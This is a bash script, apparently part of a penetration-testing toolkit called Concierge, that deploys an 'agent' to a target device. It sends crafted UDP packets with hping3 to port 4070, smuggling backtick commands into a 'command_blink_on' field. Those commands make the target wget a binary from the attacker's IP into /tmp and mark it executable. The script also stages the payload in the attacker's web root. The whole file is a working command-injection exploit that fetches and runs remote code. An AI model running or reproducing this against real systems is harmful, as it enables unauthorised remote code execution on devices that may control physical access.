#!/bin/bash
###########################################################################
# Writen by Mike Kelly                                                    #
# twitter.com/lixmk                                                       #
# github.com/lixmk                                                        #
# exfil.co                                                                #
###########################################################################
#                                                                         # 
#                   Concierge - 'agent' Script Deployer                   #
#                                                                         #
###########################################################################
#                                                                         #
# This program is free software: you can redistribute it and/or modify    #
# it under the terms of the GNU General Public License as published by    #
# the Free Software Foundation, either version 3 of the License, or       #
# at your option) any later version.                                      #
#                                                                         #
# This program is distributed in the hope that it will be useful,         #
# but WITHOUT ANY WARRANTY; without even the implied warranty of          #
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           #
# GNU General Public License for more details.                            #
#                                                                         #
# You should have received a copy of the GNU General Public License       #
# along with this program.  If not, see <http://www.gnu.org/licenses/>.   #
#                                                                         #
###########################################################################

CMDEXEC=`which hping3`
EXPECTED_ARGS=3;
if [ $# -ne $EXPECTED_ARGS ]
then
	echo "Usage: ./agentdeploy.sh <target ip> <target mac> <attackerip>"
  echo "Example: ./agentdeploy.sh 10.0.0.1 00:11:22:33:44:55"
	exit 1
fi

echo "[*] Creating Data Files."
if [ "$(ls | egrep -q datafiles && echo "1" || echo "0")" = "0" ]
then
  mkdir datafiles
  cd ./datafiles
else
  cd ./datafiles
fi
echo 'command_blink_on;044;'$2';1`wget -O /tmp/agent http://'$3'/a`;' > data1.txt
echo 'command_blink_on;044;'$2';1`chmod +x /tmp/agent`;' > data2.txt
cp ../tools/agent /var/www/html/a
echo "[*] Data files created"

echo "[*] Executing"
echo "[*] Sending Payload 1"
${CMDEXEC} -2 -p 4070 -c 1 -E data1.txt -d 150 $1 2> /dev/null
sleep 5
echo ""

echo "[*] Sending Payload 2"
${CMDEXEC} -2 -p 4070 -c 1 -E data2.txt -d 150 $1 2> /dev/null
echo ""
cd ../
echo "[*] 'agent' script deployed to $1"
echo "[*] Use triggeragent.sh to trigger the agent script."
